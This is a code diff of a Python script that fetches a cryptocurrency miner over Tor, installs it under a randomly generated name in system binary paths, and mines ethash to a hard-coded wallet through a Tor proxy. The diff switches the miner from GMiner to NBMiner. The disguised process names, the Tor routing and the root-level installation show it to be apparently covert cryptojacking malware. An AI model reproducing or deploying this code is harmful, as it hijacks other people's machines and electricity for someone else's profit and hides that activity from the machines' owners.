@@ -11,8 +11,8 @@ import ast, random, string
 useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = ''
-link_github = 'https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz'
-link_folder = 'gminer_2_68_linux64.tar.xz'
+link_github = 'https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz'
+link_folder = 'NBMiner_39.5_Linux.tgz'
 for k in range(1, 8, 1):
     program += random.choice(string.ascii_lowercase)
 os.system('pkill ' + program)
@@ -24,21 +24,22 @@ except:
     pass
 try:
 
-    if not os.path.isfile('/root/miner'):
+    if not os.path.isfile('/root/NBMiner_Linux/nbminer'):
         os.chdir('/root')
         #os.system('rm -rf %s' %link_folder)
         os.system('torify wget ' + link_github)
-        os.system('tar -xf ' + link_folder)
+        os.system('tar -zxf ' + link_folder)
+        os.chdir('/root/NBMiner_Linux')
         workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' +'/usr/local/bin/' + program)
-        os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + 'nbminer' + ' ' +'/usr/local/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + 'nbminer' + ' ' + '/usr/bin/' + program)
         time.sleep(2)
     else:
         try:
-            os.chdir('/root')
+            os.chdir('/root/NBMiner_Linux')
             workingdir = os.getcwd()
-            os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/local/bin/' + program)
-            os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/bin/' + program)
+            os.system('ln -s -f ' + workingdir + '/' + 'nbminer' + ' ' + '/usr/local/bin/' + program)
+            os.system('ln -s -f ' + workingdir + '/' + 'nbminer' + ' ' + '/usr/bin/' + program)
             time.sleep(2)
         except:
             pass
@@ -55,5 +56,4 @@ except:
 os.system('tor &')
 time.sleep(60)
 #os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
-cmd = [program,'--algo','ethash', '--server', 'asia1.ethermine.org:4444', '--proxy', '127.0.0.1:9050', '--user', '0xbefefb5612d0775d592cb8c0b9411f8a57da5701.'+program]
-subprocess.Popen (cmd)
+os.system (program + ' -a ethash -o asia1.ethermine.org:4444 --proxy 127.0.0.1:9050 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701.'+program)
